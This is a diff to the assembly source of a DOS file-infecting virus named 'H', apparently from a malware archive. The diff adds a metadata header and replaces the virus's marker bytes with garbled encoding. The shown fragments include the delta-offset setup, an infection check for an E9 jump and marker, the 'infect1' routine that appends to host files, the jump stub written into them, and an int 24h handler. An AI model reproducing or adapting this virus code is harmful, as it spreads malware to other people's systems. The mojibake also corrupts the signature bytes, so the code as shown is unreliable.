@@ -1,5 +1,16 @@
+; ------------------------------------------------------------
+; name      H
+; type      asm
+; cve       ‚Äî
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     ‚Äî
+; ------------------------------------------------------------
                 call    rakett
-old             db 'Õ ê!≠'
+old             db 'ÔøΩ ÔøΩ!ÔøΩ'
 rakett:         pop     bp
                 push    bp
                 add     bp,-103h
@@ -208,7 +219,7 @@ okay_open:      xchg    bx,ax
                 je      close
                 cmp     old[0],0E9h
                 jne     infect1
-                cmp     word old[3],'≠!'
+                cmp     word old[3],'ÔøΩ!'
                 jne     infect1
 
 close:          pop     dx
@@ -259,7 +270,7 @@ infect1:        mov     ax,4202h
 
 putjmp          db 0E9h
                 dw 0
-                db '!≠'
+                db '!ÔøΩ'
 
 install_24:     pushf
                 cli
